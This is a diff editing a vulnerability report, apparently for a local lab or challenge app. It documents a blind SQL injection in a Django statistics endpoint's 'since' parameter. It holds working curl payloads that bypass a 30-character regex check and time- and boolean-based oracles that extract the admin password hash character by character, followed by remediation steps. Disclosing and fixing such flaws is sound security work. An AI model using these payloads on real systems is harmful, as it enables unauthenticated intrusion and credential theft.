@@ -1,6 +1,6 @@
 # Description
 
-**Vulnerability:** Blind SQL Injection via the undocumented `since` parameter of `GET /api/css/marketplace-stats/` (regex-bypass, time-based and boolean-based)
+**Vulnerability:** Blind SQL Injection via the `since` parameter of `GET /api/css/marketplace-stats/` (regex bypass, time-based and boolean-based)
 
 **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command, "SQL Injection")
 
@@ -8,11 +8,11 @@
 
 ```python
 # djangoWocshack_5/Api/views.py
-3787    since    = request.GET.get('since', '').strip()
+3787    since = request.GET.get('since', '').strip()
 ...
 3796    if since:
-3797        if _re.match(r'^[\d\-]+$', since[:30]):          # validates only the first 30 chars
-3798            conditions.append(f"created_at > '{since}'")  # full value interpolated raw
+3797        if _re.match(r'^[\d\-]+$', since[:30]):           # validates only the first 30 chars
+3798            conditions.append(f"created_at > '{since}'") # full value interpolated raw
 ...
 3800    where = " AND ".join(conditions)
 ...
@@ -26,59 +26,67 @@
 3819        return api_success({"total": 0, "free": 0, "paid": 0})
 ```
 
-The route is registered in `djangoWocshack_5/Api/urls.py:241` (`path("css/marketplace-stats/", views.marketplace_stats, ...)`). The deployed OpenAPI schema does list the endpoint and its `since` parameter (`Api/views.py:1209-1218`, described as "ISO date — only files created after this date"), so it is not hidden from the schema in this build; the dev README's statement that it is undocumented does not match the deployed source. The endpoint is not linked from the UI, and it requires no authentication (`@require_GET` only, no `@api_auth_required`).
+The route is registered in `djangoWocshack_5/Api/urls.py` (`path("css/marketplace-stats/", views.marketplace_stats, ...)`). The OpenAPI schema also lists the endpoint and its `since` parameter, described as "ISO date — only files created after this date". Therefore, the parameter is documented in this build, although the endpoint is not linked from the UI.
 
-**Root cause.** The developer intended the `since` value to be a date string, and wrote a regex check to enforce that. The check, however, runs against `since[:30]`, i.e. only the first 30 characters, while the f-string on line 3798 interpolates the entire value into the SQL text. Any input whose first 30 characters are digits or hyphens passes the check, and everything from character 31 onward is attacker-controlled SQL.
+The endpoint requires no authentication (`@require_GET` only, no `@api_auth_required`).
+
+**Root cause.** The developer intended the `since` value to be a date string, and wrote a regex check to enforce that. The check, however, runs against `since[:30]`, i.e. only the first 30 characters, while the f-string interpolates the entire value into the SQL text. Any input whose first 30 characters are digits or hyphens passes the check, and everything from character 31 onward is attacker-controlled SQL.
 
 **Regex-bypass pattern.** The 30-character prefix satisfies `^[\d\-]+$`, and the rest closes the SQL string literal, injects a boolean predicate, and comments out the trailing quote:
 
-```
+```text
 since = <30 chars of [0-9-]>' AND (<injection>) --
         └──── passes regex ───┘ └──── injected after char 30 ────┘
 
-Rendered SQL (line 3810):
+Rendered SQL:
   WHERE is_active = 1 AND created_at > '2000-01-01-0000000000000000000' AND (<injection>) --'
 ```
 
-Because the regex never sees character 31 onward, the quote and `--` are never validated. The quote at position 31 is the one that terminates the original literal, and `--` removes the original closing quote from the statement.
+Because the regex never sees character 31 onward, the quote and `--` are never validated. The quote at position 31 terminates the original string literal, and `--` comments out the original closing quote.
 
-**Why it is hard to find.** The `since` parameter is not documented or linked from the UI, so testers who fuzz only `q`/`search`/`filter` never reach it. The regex creates a false sense of safety, and the endpoint never returns SQL errors: the `try/except` on lines 3818-3819 converts every database exception into `{"total":0,"free":0,"paid":0}`, so a malformed payload looks like a valid "zero results" response.
+**Why it is hard to find.** Although the endpoint and parameter are documented in OpenAPI, they are not exposed through the application UI. Testers focusing only on common search parameters such as `q`, `search`, or `filter` may overlook `since`. The regex creates a false sense of safety, and the endpoint does not expose SQL errors: the `try/except` converts database exceptions into a valid-looking zero-count response.
 
 **Oracles.** Two side channels are available:
 
-1. **Time (primary).** When the injected predicate is true, SQLite evaluates a large `randomblob` allocation (`SUM(length(randomblob(1000000)))` over up to 50 `Api_css` rows, roughly 50 MB). When it is false, that branch is skipped. Measured against the local stack: ~500 ms when the condition is true, ~10 ms when false.
-2. **Body (secondary).** The injected predicate also gates the outer `WHERE`, so the JSON `total` changes with the condition: when the admin check is true the response is `{"total":N,...}` with N = the number of active CSS rows, and when it is false the response is `{"total":0,"free":0,"paid":0}`. The response is therefore *not* always identical as the internal dev notes suggest; the body itself is a usable boolean oracle when the attacker can see `total` and does not depend on timing. Timing is still the more robust channel for predicates that are equal on every row.
+1. **Time (primary).** When the injected predicate is true, SQLite evaluates a computationally expensive expression using `SUM(length(randomblob(1000000)))` over `Api_css`. When false, the expensive branch is skipped. On the tested local instance, TRUE responses took approximately 490–500 ms, compared with approximately 6–10 ms for FALSE responses.
+2. **Body (secondary).** The injected predicate also controls the outer `WHERE` condition. When true, the JSON response contains the matching CSS counts; when false, the counts are zero. The response body therefore provides a boolean oracle without relying on timing.
 
-Note: the SQLite-specific `randomblob` technique is used because SQLite has no `SLEEP()`. The time signal depends on the number of rows in `Api_css` (the allocation scales with `min(rows, 50)`); with fewer than 50 active rows the TRUE delay shrinks proportionally.
+SQLite does not provide a built-in `SLEEP()` function. The PoC uses `randomblob()` to create an observable delay.
+
+**Important:** The `LIMIT 50` in the original aggregate subquery does not limit the number of rows processed by `SUM()`. It limits the number of result rows returned after aggregation. The actual workload and delay therefore depend on the number of rows processed by the query, rather than being capped at 50 rows.
 
 # Exploitation
 
 | Step | Action | Result |
 |------|--------|--------|
-| 1 | Discover the endpoint by reading the source (or by fuzzing `GET /api/*` for undocumented routes), finding `marketplace_stats()` and its `since` parameter. | `since` is interpolated into SQL after a regex check on `since[:30]`. |
-| 2 | Send a plain payload `since=foo'` to confirm the regex rejects it. | The regex `^[\d\-]+$` fails on the first character, so `since` is ignored and the response is the unfiltered count. |
-| 3 | Send a payload whose first 30 characters are digits/hyphens: `2000-01-01-0000000000000000000' AND 1=1 --`. | Regex passes on the prefix; `AND 1=1` is true, so the response is the full count (e.g. `{"total":313,...}`). |
-| 4 | Send the same prefix with `AND 1=2 --`. | The response becomes `{"total":0,"free":0,"paid":0}`, confirming boolean control over the outer `WHERE`. |
-| 5 | Ask a yes/no question about the database through a time-gated subquery: `AND (SELECT CASE WHEN (SELECT COUNT(*) FROM auth_user WHERE username='admin')>0 THEN (SELECT SUM(length(randomblob(1000000))) FROM Api_css LIMIT 50) ELSE 0 END)>0 --`. | Response takes ~500 ms if the `admin` user exists, ~10 ms if not. Body is `total:N` vs `total:0`. |
-| 6 | Repeat step 5 with a different username (`nobody`) to calibrate the FALSE baseline. | ~10 ms, confirming the timing oracle. |
-| 7 | Extract data one character at a time with `SUBSTR()` on the target column, e.g. `SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)='p'`. | Slow response means the guessed character is correct. Iterate over the character set per position (about 50 requests per character for a 88-character hash, per the dev notes). |
-| 8 | Use the recovered data (password hash, private rows from other tables) as needed. | Full read of any table reachable by the DB user, without authentication and without leaving login events in the application logs. |
+| 1 | Discover `/api/css/marketplace-stats/` through the API schema or source code and inspect its `since` parameter. | `since` is interpolated into SQL after a regex check on only `since[:30]`. |
+| 2 | Send a plain payload `since=foo'` to confirm the regex rejects it. | The regex fails on the first character, so `since` is ignored and the unfiltered count is returned. |
+| 3 | Send `2000-01-01-0000000000000000000' AND 1=1 --`. | The regex passes on the prefix. The TRUE condition preserves the matching CSS count. |
+| 4 | Send the same prefix with `AND 1=2 --`. | The FALSE condition produces zero results, confirming boolean control over the SQL query. |
+| 5 | Use a time-gated subquery to check whether the `admin` user exists. | The TRUE condition evaluates the expensive `randomblob()` expression, causing an observable delay. |
+| 6 | Repeat the test with a nonexistent username (`nobody`). | The FALSE condition skips the expensive expression, confirming the timing difference. |
+| 7 | Test a character of a database value with `SUBSTR()`, e.g. the first character of the admin password hash. | A matching predicate produces the TRUE response delay. |
+| 8 | Repeat character comparisons to infer additional database values. | Demonstrates the potential for blind data extraction from tables accessible to the application database connection. |
 
 # PoC
 
-All requests are unauthenticated `GET` requests. `-w "%{time_total}"` prints the response time in seconds. Note that `--` in the payload is needed to comment out the original closing quote, and that the first 30 characters (`2000-01-01-0000000000000000000`) must consist only of digits and hyphens.
+All requests are unauthenticated `GET` requests. The `-w "%{time_total}"` option prints the response time in seconds.
+
+The `--` sequence comments out the original closing quote. The first 30 characters (`2000-01-01-0000000000000000000`) contain only digits and hyphens, allowing the regex check to pass.
 
 **1. Regex bypass, boolean body oracle (confirms injection)**
 
 ```bash
-# Injected predicate TRUE -> full count returned
+# Injected predicate TRUE -> matching CSS count returned
 curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=1%20--"
-# {"total":313,"free":35,"paid":278}
+# {"success":true,"data":{"total":305,"free":27,"paid":278}}
 
 # Injected predicate FALSE -> zero rows
 curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=2%20--"
-# {"total":0,"free":0,"paid":0}
+# {"success":true,"data":{"total":0,"free":0,"paid":0}}
 ```
+
+The counts above were observed on the local test instance and may differ depending on the seeded data.
 
 **2. Time-based blind oracle: does user `admin` exist?**
 
@@ -95,48 +103,65 @@ curl -s -o /dev/null -w "%{time_total}\n" \
 **3. Time-based extraction of the admin password hash, first character**
 
 ```bash
-# Slow (~500 ms) => the first character of admin's password is 'p'
+# Slow (~500 ms) => the first character of admin's password hash is 'p'
 curl -s -o /dev/null -w "%{time_total}\n" -G \
   "http://localhost:8000/api/css/marketplace-stats/" \
   --data-urlencode "since=2000-01-01-0000000000000000000' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)='p' THEN (SELECT SUM(length(randomblob(1000000))) FROM Api_css LIMIT 50) ELSE 0 END)>0 --"
 ```
 
-Repeat step 3 for each position and each candidate character, classifying each response as slow (match) or fast (miss). A scripted loop over the charset with a threshold of ~250 ms is sufficient to separate the two classes.
+The character comparison was reproduced multiple times, with response times consistently around 490–500 ms. Extracting a complete password hash was not necessary to demonstrate the vulnerability.
 
 **Expected results**
 
-| Request | Predicate | Time | Body |
-|---------|-----------|------|------|
-| `admin` exists | TRUE | ~500 ms | `{"total":313,...}` |
-| `nobody` | FALSE | ~10 ms | `{"total":0,"free":0,"paid":0}` |
+| Request | Predicate | Observed time | Response |
+|---------|-----------|---------------|----------|
+| `AND 1=1` | TRUE | Not measured | `total: 305` |
+| `AND 1=2` | FALSE | Not measured | `total: 0` |
+| `admin` exists | TRUE | 0.496719 s | Slow response |
+| `nobody` exists | FALSE | 0.006426 s | Fast response |
+| Admin hash first character = `p` | TRUE | 0.488–0.498 s | Slow response |
 
-The time delay is only observable when `Api_css` contains at least 50 rows, because the subquery uses `LIMIT 50`. Fewer rows shorten the delay proportionally, so timing thresholds should be calibrated against the target.
+These timings are specific to the tested instance. The delay depends on database size, execution environment, and system load. Timing thresholds should be calibrated against both TRUE and FALSE conditions.
 
 # Risk
 
 | Dimension | Impact |
 |-----------|--------|
-| Confidentiality | **High.** Any table the application database user can read is reachable one bit at a time: `auth_user` (usernames, password hashes), `Api_css`, banking tables, private messages. No authentication is required. |
-| Integrity | **None.** The injection point is in a `SELECT` statement and cannot modify data. Stacked queries are not possible through the Django cursor with a single `execute`. |
-| Availability | **Low.** Each TRUE probe allocates about 50 MB inside SQLite. Automated extraction issues thousands of such requests, which can degrade the server, but a single request is not disruptive. |
+| Confidentiality | **High.** An unauthenticated attacker can infer values from tables accessible through the application's database connection, including `auth_user` usernames and password hashes. The PoC demonstrates inference of a character from the admin password hash. Full database extraction was not performed. |
+| Integrity | **None demonstrated.** The injection occurs in a `SELECT` statement. The tested PoC does not modify database records, and stacked statements are not supported by the demonstrated execution path. |
+| Availability | **Low.** The expensive `randomblob()` expression consumes database resources. Repeated requests could degrade application performance, although a sustained denial-of-service impact has not been demonstrated. |
 
-Overall severity: **High** (CVSS 3.1 7.5, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`). Full read of the database without credentials, reached through a parameter that is not documented and whose validation only inspects 30 characters. Difficulty is **Very Hard** because the endpoint must be discovered and the regex bypass understood from the source, and because extraction is blind and requires a timing or body oracle built from scratch. Impact is limited to confidentiality, and the attacker needs the target's row count and latency characteristics to calibrate the oracle.
+Overall severity: **High** (CVSS 3.1 **7.5**, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`).
+
+The injection is reachable without authentication and allows blind inference of database values. Once the vulnerable parameter and payload format are known, exploitation does not require special external conditions.
+
+**Challenge difficulty: Very Hard.** Discovering the vulnerable parameter, understanding the partial regex validation, and extracting data through blind inference require significant investigation. This challenge difficulty is separate from the CVSS Attack Complexity metric.
 
 # Remediation
 
-1. **Use a parameterised query, not an f-string.** Bind `since` as a parameter, so the SQL text never contains user input:
+1. **Use a parameterised query, not an f-string.** Bind `since` as a parameter so the SQL text never contains user-controlled SQL syntax:
+
    ```python
    params = []
    if since:
-       conditions.append("created_at > %s")   # or "?" for sqlite3
+       conditions.append("created_at > %s")
        params.append(since)
+
    cur.execute(f"""SELECT ... FROM Api_css WHERE {where}""", params)
    ```
-2. **Parse the value as a date.** Use `datetime.fromisoformat()` (or `django.utils.dateparse.parse_datetime`/`parse_date`) and reject anything that does not parse. Pass the typed value to the ORM, e.g. `Css.objects.filter(is_active=True, created_at__gt=since_dt)`, which removes raw SQL from this view entirely.
-3. **Validate the whole value, not a slice.** If a regex is kept, use `re.fullmatch` against the complete string. Never validate `since[:30]`.
-4. **Stop swallowing errors.** The `except Exception` on lines 3818-3819 hides failed queries behind a valid-looking zero-count response. Log the exception and return a 400 for invalid input so that malformed probes are visible in monitoring.
-5. **Least-privilege database user.** The application's DB user should not be able to read `auth_user` password hashes or unrelated tables from a statistics endpoint. This limits the blast radius even when an injection is present.
-6. **Document or remove the endpoint.** Hidden endpoints do not receive the same review as documented ones. Either remove `since` if it is not needed, or add the endpoint to the API schema so it is covered by normal security review.
+
+   Django database cursors use `%s` placeholders, including when the underlying database is SQLite.
+
+2. **Parse the value as a date.** Use `datetime.fromisoformat()` or Django's `parse_datetime` / `parse_date` utilities and reject invalid input. Prefer the Django ORM, for example `Css.objects.filter(is_active=True, created_at__gt=since_dt)`, to avoid constructing raw SQL.
+
+3. **Validate the whole value, not a slice.** If a regex is retained, use `re.fullmatch()` against the complete input. Never validate only `since[:30]`.
+
+4. **Handle errors explicitly.** Invalid date input should return an appropriate client error, such as HTTP 400. Unexpected database exceptions should be logged server-side and returned as generic server errors rather than being silently converted into successful zero-count responses.
+
+5. **Limit database access.** Restrict the statistics functionality to the minimum data it requires. With SQLite, table-level user permissions are not available, so stronger isolation requires separating sensitive data or exposing it through appropriately restricted service interfaces.
+
+6. **Keep the API schema accurate and review exposed endpoints.** The endpoint and `since` parameter are already documented in OpenAPI. Ensure that they receive normal security review, and remove `since` if it is not required.
 
 # Author
+
 WOCSA
